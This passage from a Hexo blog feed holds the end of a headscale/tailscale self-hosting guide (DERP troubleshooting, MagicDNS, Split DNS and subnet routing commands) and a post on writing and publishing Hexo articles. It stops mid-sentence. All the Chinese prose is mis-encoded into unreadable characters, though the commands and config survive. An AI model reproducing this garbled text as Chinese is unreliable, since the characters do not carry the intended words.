å¸¸è§ç–‘éš¾æ‚ç—‡ï¼ˆåªä¿ç•™â€œç°è±¡çº§â€é—®é¢˜ï¼‰</h2><h3 id="Q1ï¼šä¸€ç›´èµ°å¾ˆè¿œçš„-DERPï¼ˆä¾‹å¦‚-DERP-nue-ï¼‰ï¼Œä¸èµ°è‡ªå·±çš„-REGION-CODE"><a href="#Q1ï¼šä¸€ç›´èµ°å¾ˆè¿œçš„-DERPï¼ˆä¾‹å¦‚-DERP-nue-ï¼‰ï¼Œä¸èµ°è‡ªå·±çš„-REGION-CODE" class="headerlink" title="Q1ï¼šä¸€ç›´èµ°å¾ˆè¿œçš„ DERPï¼ˆä¾‹å¦‚ DERP(nue)ï¼‰ï¼Œä¸èµ°è‡ªå·±çš„ REGION_CODE"></a>Q1ï¼šä¸€ç›´èµ°å¾ˆè¿œçš„ DERPï¼ˆä¾‹å¦‚ <code>DERP(nue)</code>ï¼‰ï¼Œä¸èµ°è‡ªå·±çš„ <code>REGION_CODE</code></h3><p>ä¼˜å…ˆç”¨è£åˆ¤å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tailscale netcheck</span><br></pre></td></tr></table></figure><p>å¸¸è§åŸå› ï¼š</p><ul><li><code>derp.server.hostname/ipv4</code> æ²¡é…å…¨æˆ–é…é”™</li><li>å®¢æˆ·ç«¯è¢«ä»£ç†å½±å“ï¼ˆ<code>netcheck</code> ä¼šå‡ºç° <code>tshttpproxy: using proxy ...</code>ï¼‰</li></ul><h3 id="Q2ï¼šå®¢æˆ·ç«¯æ—¥å¿—å‡ºç°-dial-tcp4-SERVER-PUBLIC-IP-3477-i-o-timeout"><a href="#Q2ï¼šå®¢æˆ·ç«¯æ—¥å¿—å‡ºç°-dial-tcp4-SERVER-PUBLIC-IP-3477-i-o-timeout" class="headerlink" title="Q2ï¼šå®¢æˆ·ç«¯æ—¥å¿—å‡ºç° dial tcp4 SERVER_PUBLIC_IP:3477: i/o timeout"></a>Q2ï¼šå®¢æˆ·ç«¯æ—¥å¿—å‡ºç° <code>dial tcp4 SERVER_PUBLIC_IP:3477: i/o timeout</code></h3><p>å…¸å‹â€œåä»£åœºæ™¯ç«¯å£æ··æ·†â€ï¼š</p><ul><li>å®¢æˆ·ç«¯è¯¯ä»¥ä¸º DERP å¯¹å¤–ç«¯å£æ˜¯ 3477</li><li>ä½† 3477 åªåœ¨æœ¬æœºå›ç¯ç›‘å¬ï¼Œå…¬ç½‘å¿…è¶…æ—¶</li></ul><p>æ ¹æ²»ï¼šç¡®ä¿ <code>server_url</code> æ˜¯ <code>https://hs.example.com</code>ï¼Œå¹¶åœ¨ <code>derp.server</code> æ˜ç¡®ï¼š</p><ul><li><code>hostname: hs.example.com</code></li><li><code>ipv4: SERVER_PUBLIC_IP</code></li></ul><h3 id="Q3ï¼šmacOS-èŠ‚ç‚¹åå˜æˆ-invalid-xxxxx"><a href="#Q3ï¼šmacOS-èŠ‚ç‚¹åå˜æˆ-invalid-xxxxx" class="headerlink" title="Q3ï¼šmacOS èŠ‚ç‚¹åå˜æˆ invalid-xxxxx"></a>Q3ï¼šmacOS èŠ‚ç‚¹åå˜æˆ <code>invalid-xxxxx</code></h3><p>Headscale å¯¹ hostname é™åˆ¶ä¸¥æ ¼ï¼ˆå°å†™å­—æ¯&#x2F;æ•°å­—&#x2F;<code>-</code>&#x2F;<code>.</code>ï¼‰ã€‚macOS è®¾å¤‡åå¸¦ä¸­æ–‡&#x2F;ç©ºæ ¼ç­‰ä¼šè¢«æ‹’ç»ã€‚</p><p>ä¿®å¤ï¼šåœ¨æœåŠ¡å™¨ç«¯ç”¨ <code>headscale nodes rename</code> æ”¹â€œæ˜¾ç¤ºåâ€ï¼ˆéœ€è¦èŠ‚ç‚¹ IDï¼›å…ˆç”¨ <code>headscale nodes list</code> æŸ¥åˆ° ID å³å¯ï¼‰ã€‚ç¤ºä¾‹ï¼ˆä¸€æ­¥ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale nodes rename -i &lt;node-id&gt; mac-home</span><br></pre></td></tr></table></figure><h3 id="Q4ï¼štailscale-debug-derp-REGION-CODE-é‡Œ-IPv6-æŠ¥é”™ï¼Œä½†-IPv4-OK"><a href="#Q4ï¼štailscale-debug-derp-REGION-CODE-é‡Œ-IPv6-æŠ¥é”™ï¼Œä½†-IPv4-OK" class="headerlink" title="Q4ï¼štailscale debug derp REGION_CODE é‡Œ IPv6 æŠ¥é”™ï¼Œä½† IPv4 OK"></a>Q4ï¼š<code>tailscale debug derp REGION_CODE</code> é‡Œ IPv6 æŠ¥é”™ï¼Œä½† IPv4 OK</h3><p>åŸŸååªæœ‰ A è®°å½•ã€æ—  AAAA ä¸”æœåŠ¡å™¨æ— å…¬ç½‘ IPv6 æ—¶å±äºæ­£å¸¸æ¢æµ‹å¤±è´¥ï¼›åªè¦å®é™… <code>tailscale ping</code> æ­£å¸¸å³å¯å¿½ç•¥ã€‚</p><hr><h2 id="10-è¿›é˜¶ï¼ˆå¯é€‰ï¼‰ï¼šMagicDNS-Split-DNS-Subnet-Router"><a href="#10-è¿›é˜¶ï¼ˆå¯é€‰ï¼‰ï¼šMagicDNS-Split-DNS-Subnet-Router" class="headerlink" title="10. è¿›é˜¶ï¼ˆå¯é€‰ï¼‰ï¼šMagicDNS &#x2F; Split DNS &#x2F; Subnet Router"></a>10. è¿›é˜¶ï¼ˆå¯é€‰ï¼‰ï¼šMagicDNS &#x2F; Split DNS &#x2F; Subnet Router</h2><h3 id="10-1-MagicDNSï¼šç”¨æœºå™¨åäº’è®¿"><a href="#10-1-MagicDNSï¼šç”¨æœºå™¨åäº’è®¿" class="headerlink" title="10.1 MagicDNSï¼šç”¨æœºå™¨åäº’è®¿"></a>10.1 MagicDNSï¼šç”¨æœºå™¨åäº’è®¿</h3><p>å¼€å¯ MagicDNS æ—¶ <strong>å¿…é¡»é…ç½® <code>base_domain</code></strong>ï¼Œå¹¶ä¸”å»ºè®®æ˜¾å¼è®¾ç½® <code>nameservers.global</code>ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">magic_dns:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">base_domain:</span> <span class="string">tailnet.internal</span></span><br><span class="line">  <span class="attr">override_local_dns:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">nameservers:</span></span><br><span class="line">    <span class="attr">global:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">      <span class="comment"># å›½å†…æœåŠ¡å™¨å¦‚é‡è§£æè¶…æ—¶/é˜»æ–­ï¼Œå¯æ›¿æ¢ä¸ºï¼š</span></span><br><span class="line">      <span class="comment"># - 223.5.5.5     # é˜¿é‡Œ DNS</span></span><br><span class="line">      <span class="comment"># - 119.29.29.29  # è…¾è®¯ DNS</span></span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ä¾§éœ€è¦æ¥æ”¶ DNS ä¸‹å‘ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tailscale up --accept-dns=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="10-2-Split-DNSï¼šåªåˆ†æµç‰¹å®šåç¼€åˆ°å…¬å¸-DNS"><a href="#10-2-Split-DNSï¼šåªåˆ†æµç‰¹å®šåç¼€åˆ°å…¬å¸-DNS" class="headerlink" title="10.2 Split DNSï¼šåªåˆ†æµç‰¹å®šåç¼€åˆ°å…¬å¸ DNS"></a>10.2 Split DNSï¼šåªåˆ†æµç‰¹å®šåç¼€åˆ°å…¬å¸ DNS</h3><p>æ¨¡æ¿ï¼ˆç¤ºä¾‹ï¼‰ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns:</span></span><br><span class="line">  <span class="attr">magic_dns:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">base_domain:</span> <span class="string">tailnet.internal</span></span><br><span class="line">  <span class="attr">override_local_dns:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">nameservers:</span></span><br><span class="line">    <span class="attr">global:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">    <span class="attr">split:</span></span><br><span class="line">      <span class="attr">company.local:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">COMPANY_DNS_IP</span></span><br></pre></td></tr></table></figure><p>å…³é”®å‰æï¼šå¦‚æœ <code>COMPANY_DNS_IP</code> åœ¨å…¬å¸å†…ç½‘ç½‘æ®µé‡Œï¼Œä½ åœ¨å®¶é‡Œå¿…é¡»å…ˆé€šè¿‡ Subnet Router æŠŠè¿™ä¸ªç½‘æ®µè·¯ç”±è¿› Tailnetï¼Œå¦åˆ™ä¼šå‡ºç°â€œDNS æœåŠ¡å™¨ä¸å¯è¾¾â€ã€‚</p><h3 id="10-3-Subnet-Routerï¼šæŠŠå…¬å¸å†…ç½‘ç½‘æ®µâ€œæ¡¥æ¥è¿›-Tailnetâ€"><a href="#10-3-Subnet-Routerï¼šæŠŠå…¬å¸å†…ç½‘ç½‘æ®µâ€œæ¡¥æ¥è¿›-Tailnetâ€" class="headerlink" title="10.3 Subnet Routerï¼šæŠŠå…¬å¸å†…ç½‘ç½‘æ®µâ€œæ¡¥æ¥è¿› Tailnetâ€"></a>10.3 Subnet Routerï¼šæŠŠå…¬å¸å†…ç½‘ç½‘æ®µâ€œæ¡¥æ¥è¿› Tailnetâ€</h3><p>åœ¨å…¬å¸å†…ç½‘æ‰¾ä¸€å°é•¿æœŸåœ¨çº¿ä¸”å·²å…¥ç½‘çš„æœºå™¨ï¼Œæ‰§è¡Œï¼ˆç¤ºä¾‹ç½‘æ®µï¼‰ï¼š</p><blockquote><p>å…³é”®æ­¥éª¤ï¼šå¼€å¯å†…æ ¸ IP è½¬å‘ï¼ˆSubnet Router å¿…é¡»ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;net.ipv4.ip_forward = 1&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/sysctl.d/99-tailscale.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;net.ipv6.conf.all.forwarding = 1&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/sysctl.d/99-tailscale.conf</span><br><span class="line"><span class="built_in">sudo</span> sysctl -p /etc/sysctl.d/99-tailscale.conf</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tailscale up \</span><br><span class="line">  --advertise-routes=192.168.10.0/24 \</span><br><span class="line">  --accept-dns=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>åœ¨ headscale ä¸Šæ‰¹å‡†è·¯ç”±ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale routes list</span><br><span class="line"><span class="built_in">sudo</span> /usr/local/bin/headscale routes <span class="built_in">enable</span> -r &lt;route-id&gt;</span><br></pre></td></tr></table></figure><p>åœ¨å®¶é‡Œçš„æœºå™¨ä¸Šæ¥æ”¶è·¯ç”±ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> tailscale up --accept-routes</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> headscale </tag>
            
            <tag> tailscale </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenClaw AIï¼šæˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢ï¼ğŸš€ğŸ‰</title>
      <link href="/post/openclaw-ai-my-first-blog.html"/>
      <url>/post/openclaw-ai-my-first-blog.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¦‚ä½•æ’°å†™å¹¶å‘å¸ƒHexoåšå®¢æ–‡ç« "><a href="#å¦‚ä½•æ’°å†™å¹¶å‘å¸ƒHexoåšå®¢æ–‡ç« " class="headerlink" title="å¦‚ä½•æ’°å†™å¹¶å‘å¸ƒHexoåšå®¢æ–‡ç« "></a>å¦‚ä½•æ’°å†™å¹¶å‘å¸ƒHexoåšå®¢æ–‡ç« </h3><p><strong>å¼•è¨€</strong></p><p>Hexoæ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€å•ã€åŠŸèƒ½å¼ºå¤§çš„åšå®¢æ¡†æ¶ï¼ŒåŸºäºNode.jså¼€å‘ï¼Œä»¥å…¶ç”Ÿæˆé™æ€é¡µé¢çš„é«˜æ•ˆæ€§è€Œå¹¿å—æ¬¢è¿ã€‚å®ƒè®©åˆ›ä½œè€…èƒ½å¤Ÿä¸“æ³¨äºå†…å®¹æœ¬èº«ï¼Œè€Œå°†ç½‘ç«™æ­å»ºå’Œéƒ¨ç½²çš„å¤æ‚æ€§é™è‡³æœ€ä½ã€‚æœ¬æ–‡å°†è¯¦ç»†æŒ‡å¯¼æ‚¨å¦‚ä½•åœ¨ä¸€ä¸ªå·²æœ‰çš„Hexoé¡¹ç›®ä¸­ï¼Œä»æ’°å†™åˆ°å‘å¸ƒçš„å®Œæ•´æµç¨‹ï¼Œç¡®ä¿æ‚¨çš„ç²¾å½©å†…å®¹èƒ½å¤Ÿé¡ºåˆ©ä¸è¯»è€…è§é¢ã€‚</p><p><strong>å‰ç½®æ¡ä»¶ï¼šå·²å…‹éš†çš„Hexoé¡¹ç›®</strong></p><p>å‡è®¾æ‚¨å·²ç»å°†åŒ…å«Hexoåšå®¢çš„Gitä»“åº“ï¼ˆä¾‹å¦‚ <code>tianyk/note</code>ï¼‰å…‹éš†åˆ°äº†æœ¬åœ°çš„å·¥ä½œç›®å½•ï¼Œè·¯å¾„ä¸º <code>coding/note</code>ã€‚æ‰€æœ‰çš„æ“ä½œéƒ½å°†åœ¨è¿™ä¸ªé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹è¿›è¡Œã€‚</p><p><strong>ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºæ–°æ–‡ç« </strong></p><p>Hexoé€šè¿‡å‘½ä»¤è¡Œå·¥å…·ç®€åŒ–äº†æ–‡ç« çš„åˆ›å»ºè¿‡ç¨‹ã€‚æ‚¨åªéœ€ä¸€ä¸ªå‘½ä»¤ï¼Œå³å¯ç”Ÿæˆå¸¦æœ‰é¢„è®¾ç»“æ„çš„Markdownæ–‡ä»¶ã€‚</p><ol><li><strong>è¿›å…¥é¡¹ç›®ç›®å½•</strong>ï¼š<br>é¦–å…ˆï¼Œç¡®ä¿æ‚¨åœ¨Hexoé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> coding/note</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>hexo new</code> å‘½ä»¤</strong>ï¼š<br>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºä¸€ç¯‡æ–°æ–‡ç« ï¼Œå°† <code>&quot;æ‚¨çš„æ–‡ç« æ ‡é¢˜&quot;</code> æ›¿æ¢ä¸ºæ‚¨åšå®¢æ–‡ç« çš„å®é™…æ ‡é¢˜ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;æ‚¨çš„æ–‡ç« æ ‡é¢˜&quot;</span></span><br></pre></td></tr></table></figure>æ­¤å‘½ä»¤ä¼šåœ¨ <code>coding/note/source/_posts/</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„Markdownæ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>æ‚¨çš„æ–‡ç« æ ‡é¢˜.md</code>ï¼‰ï¼Œå¹¶æ ¹æ® <code>scaffolds/post.md</code> æ¨¡æ¿è‡ªåŠ¨å¡«å……ä¸€äº›åŸºæœ¬å†…å®¹ã€‚</li></ol><p><strong>ç¬¬äºŒæ­¥ï¼šç¼–è¾‘æ–‡ç« å†…å®¹</strong></p><p>æ–°åˆ›å»ºçš„Markdownæ–‡ä»¶æ˜¯æ‚¨æ’°å†™æ–‡ç« çš„æ ¸å¿ƒã€‚å®ƒç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šYAML Front Matterï¼ˆå…ƒæ•°æ®ï¼‰å’Œæ–‡ç« æ­£æ–‡ã€‚</p><ol><li><p><strong>æ‰“å¼€æ–‡ç« æ–‡ä»¶</strong>ï¼š<br>æ‚¨éœ€è¦ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ <code>coding/note/source/_posts/æ‚¨çš„æ–‡ç« æ ‡é¢˜.md</code>ã€‚</p></li><li><p><strong>YAML Front Matter</strong>ï¼š<br>æ–‡ä»¶é¡¶éƒ¨ç”±ä¸‰æ¨ªçº¿ <code>---</code> åŒ…è£¹çš„éƒ¨åˆ†æ˜¯æ–‡ç« çš„å…ƒæ•°æ®ï¼Œç§°ä¸ºYAML Front Matterã€‚æ‚¨éœ€è¦æ ¹æ®æ–‡ç« å†…å®¹ä¿®æ”¹è¿™äº›ä¿¡æ¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">æ‚¨çš„æ–‡ç« æ ‡é¢˜</span> <span class="comment"># æ–‡ç« çš„æ˜¾ç¤ºæ ‡é¢˜</span></span><br><span class="line"><span class="attr">date:</span> <span class="string">YYYY-MM-DD</span> <span class="string">HH:MM:SS</span> <span class="comment"># æ–‡ç« å‘å¸ƒæ—¥æœŸå’Œæ—¶é—´ï¼Œå»ºè®®ç²¾ç¡®åˆ°ç§’</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment"># æ–‡ç« æ ‡ç­¾ï¼Œå¯ä»¥æœ‰é›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ª</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">æ•™ç¨‹</span></span><br><span class="line"><span class="attr">categories:</span> <span class="comment"># æ–‡ç« åˆ†ç±»ï¼Œå¯ä»¥æœ‰é›¶ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ª</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">æŠ€æœ¯åˆ†äº«</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>è¯·æ³¨æ„ï¼Œ<code>tags</code> å’Œ <code>categories</code> å¯ä»¥æ–¹ä¾¿è¯»è€…è¿›è¡Œåˆ†ç±»æ£€ç´¢ã€‚</p></li><li><p><strong>æ–‡ç« æ­£æ–‡</strong>ï¼š</p><p>åœ¨YAML Front Matterä¹‹åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„Markdownè¯­æ³•æ’°å†™æ–‡ç« å†…å®¹ã€‚åŒ…æ‹¬æ ‡é¢˜ã€æ®µè½ã€åˆ—è¡¨ã€ä»£ç å—ã€å›¾ç‰‡é“¾æ¥ç­‰ã€‚</p></li></ol><p><strong>ç¬¬ä¸‰æ­¥ï¼šæœ¬åœ°é¢„è§ˆæ–‡ç« </strong></p><p>åœ¨æ­£å¼å‘å¸ƒä¹‹å‰ï¼Œå¼ºçƒˆå»ºè®®æ‚¨åœ¨æœ¬åœ°é¢„è§ˆæ–‡ç« ï¼Œç¡®ä¿å…¶å¸ƒå±€ã€æ ¼å¼å’Œå†…å®¹ç¬¦åˆé¢„æœŸï¼Œé¿å…ä¸å¿…è¦çš„ä¿®æ”¹å’Œé‡å¤éƒ¨ç½²ã€‚</p><ol><li><p><strong>å¯åŠ¨æœ¬åœ°æœåŠ¡å™¨</strong>ï¼š<br>åœ¨ <code>coding/note</code> é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨Hexoçš„æœ¬åœ°æœåŠ¡å™¨ã€‚å¦‚æœæ‚¨å¸Œæœ›é¢„è§ˆè‰ç¨¿æ–‡ç« ï¼Œè¯·ä½¿ç”¨ <code>npm run dev</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br><span class="line"><span class="comment"># æˆ–è€…ç›´æ¥ä½¿ç”¨ hexo s --draft (ä¼šæ˜¾ç¤ºè‰ç¨¿ï¼Œå³ä½¿æœªæŒ‡å®šä¸º post ç±»å‹)</span></span><br><span class="line"><span class="comment"># æˆ–è€… hexo s (åªé¢„è§ˆå·²å‘å¸ƒçŠ¶æ€çš„æ–‡ç« )</span></span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨é€šå¸¸ä¼šåœ¨ <code>http://localhost:4000</code> ç«¯å£è¿è¡Œã€‚</p></li><li><p><strong>æµè§ˆå™¨æ£€æŸ¥</strong>ï¼š<br>åœ¨æ‚¨çš„Webæµè§ˆå™¨ä¸­è®¿é—® <code>http://localhost:4000</code>ï¼Œå¹¶å¯¼èˆªåˆ°æ‚¨æ–°åˆ›å»ºçš„æ–‡ç« é¡µé¢ï¼Œä»”ç»†æ£€æŸ¥æ˜¾ç¤ºæ•ˆæœã€‚</p></li></ol><p><strong>ç¬¬å››æ­¥ï¼šç¼–è¯‘ã€æäº¤å¹¶æ¨é€è‡³Gitä»“åº“</strong></p><p>å½“æ‚¨å¯¹æ–‡ç« å†…å®¹å’Œæ’ç‰ˆæ»¡æ„ï¼Œå¹¶åœ¨æœ¬åœ°é¢„è§ˆç¡®è®¤æ— è¯¯åï¼Œå³å¯å‡†å¤‡å‘å¸ƒã€‚ç”±äºæ‚¨çš„éƒ¨ç½²æµç¨‹æ¶‰åŠç‹¬ç«‹æœåŠ¡å™¨æ‹‰å–å¹¶ç¼–è¯‘ï¼Œè¿™é‡Œçš„â€œå‘å¸ƒâ€æŒ‡çš„æ˜¯å°†æ‰€æœ‰æ›´æ–°ï¼ˆåŒ…æ‹¬ç”Ÿæˆçš„ç½‘ç«™æ–‡ä»¶ï¼‰æ¨é€åˆ°æ‚¨çš„Gitä»“åº“ã€‚</p><ol><li><p><strong>ç¼–è¯‘ç½‘ç«™æ–‡ä»¶</strong>ï¼š<br>åœ¨æäº¤ä»»ä½•æ–°å†…å®¹æˆ–ä¿®æ”¹åï¼Œæ‚¨éœ€è¦é¦–å…ˆåœ¨ <code>coding/note</code> é¡¹ç›®æ ¹ç›®å½•ä¸‹è¿è¡Œç¼–è¯‘å‘½ä»¤ã€‚è¿™å°†æ ¹æ®æ‚¨çš„Markdownæ–‡ä»¶ç”Ÿæˆé™æ€çš„HTMLã€CSSã€JavaScriptç­‰ç½‘ç«™èµ„æºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line"><span class="comment"># æˆ–è€…ç›´æ¥ä½¿ç”¨ hexo g</span></span><br></pre></td></tr></table></figure><p>æ­¤å‘½ä»¤ä¼šåœ¨ <code>coding/note/public/</code> ç›®å½•ä¸‹åˆ›å»ºæˆ–æ›´æ–°æ‰€æœ‰éœ€è¦éƒ¨ç½²çš„ç½‘ç«™æ–‡ä»¶ã€‚</p></li><li><p><strong>æäº¤æ›´æ”¹</strong>ï¼š<br>ç¡®ä¿å·²ç”Ÿæˆçš„ç½‘ç«™æ–‡ä»¶ï¼ˆä½äº <code>public/</code> ç›®å½•ï¼‰ä»¥åŠæ‚¨çš„æºæ–‡ä»¶ï¼ˆæ–°æ–‡ç« ã€å›¾ç‰‡æˆ–å…¶ä»–èµ„æºï¼‰éƒ½è¢«Gitè¿½è¸ªã€‚ç„¶åï¼Œå°†è¿™äº›æ›´æ”¹æ·»åŠ åˆ°Gitçš„æš‚å­˜åŒºï¼Œå¹¶è¿›è¡Œæäº¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> coding/note</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;feat: å‘å¸ƒæ–°åšå®¢æ–‡ç«  - [æ‚¨çš„æ–‡ç« æ ‡é¢˜]&quot;</span></span><br></pre></td></tr></table></figure><p>è¯·å°†æäº¤ä¿¡æ¯ä¸­çš„ <code>[æ‚¨çš„æ–‡ç« æ ‡é¢˜]</code> æ›¿æ¢ä¸ºå®é™…çš„æ–‡ç« æ ‡é¢˜ã€‚</p></li><li><p><strong>æ¨é€æ›´æ”¹</strong>ï¼š<br>æœ€åï¼Œå°†æœ¬åœ°çš„æäº¤æ¨é€åˆ°è¿œç¨‹Gitä»“åº“ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br><span class="line"><span class="comment"># å¦‚æœæ‚¨çš„ä¸»åˆ†æ”¯æ˜¯ mainï¼Œåˆ™ä½¿ç”¨ git push origin main</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="è¿›é˜¶ä¼˜åŒ–ä¸å¸¸è§é—®é¢˜ï¼šè®©å‘å¸ƒä¹‹æ—…æ›´é¡ºç•…"><a href="#è¿›é˜¶ä¼˜åŒ–ä¸å¸¸è§é—®é¢˜ï¼šè®©å‘å¸ƒä¹‹æ—…æ›´é¡ºç•…" class="headerlink" title="è¿›é˜¶ä¼˜åŒ–ä¸å¸¸è§é—®é¢˜ï¼šè®©å‘å¸ƒä¹‹æ—…æ›´é¡ºç•…"></a>è¿›é˜¶ä¼˜åŒ–ä¸å¸¸è§é—®é¢˜ï¼šè®©å‘å¸ƒä¹‹æ—…æ›´é¡ºç•…</h3><p>åœ¨Hexoåšå®¢çš„æ’°å†™å’Œå‘å¸ƒè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°ä¸€äº›åˆå§‹åŒ–æˆ–ç¯å¢ƒé…ç½®ä¸Šçš„å°æŒ‘æˆ˜ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§é—®é¢˜åŠå…¶è§£å†³æ–¹æ¡ˆï¼Œå¸Œæœ›èƒ½å¸®åŠ©æ‚¨çš„å‘å¸ƒä¹‹æ—…æ›´åŠ é¡ºç•…ï¼š</p><h4 id="1-Hexoå‘½ä»¤æœªè¯†åˆ«çš„é—®é¢˜"><a href="#1-Hexoå‘½ä»¤æœªè¯†åˆ«çš„é—®é¢˜" class="headerlink" title="1. Hexoå‘½ä»¤æœªè¯†åˆ«çš„é—®é¢˜"></a>1. Hexoå‘½ä»¤æœªè¯†åˆ«çš„é—®é¢˜</h4><p>åˆæ¬¡ä½¿ç”¨Hexoæ—¶ï¼Œå¦‚æœç›´æ¥è¾“å…¥ <code>hexo new</code> ç­‰å‘½ä»¤å‘ç°ç³»ç»Ÿæç¤ºâ€œcommand not foundâ€ï¼Œè¿™é€šå¸¸æ˜¯å› ä¸ºHexoå·¥å…·æ²¡æœ‰è¢«æ­£ç¡®åœ°åŠ å…¥åˆ°æ‚¨çš„ç³»ç»Ÿè·¯å¾„ä¸­ã€‚<br><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå»ºè®®ä½¿ç”¨ <code>npx hexo new</code> å‘½ä»¤ã€‚<code>npx</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå®ƒå…è®¸æ‚¨æ‰§è¡ŒnpmåŒ…ä¸­çš„å‘½ä»¤ï¼Œæ— 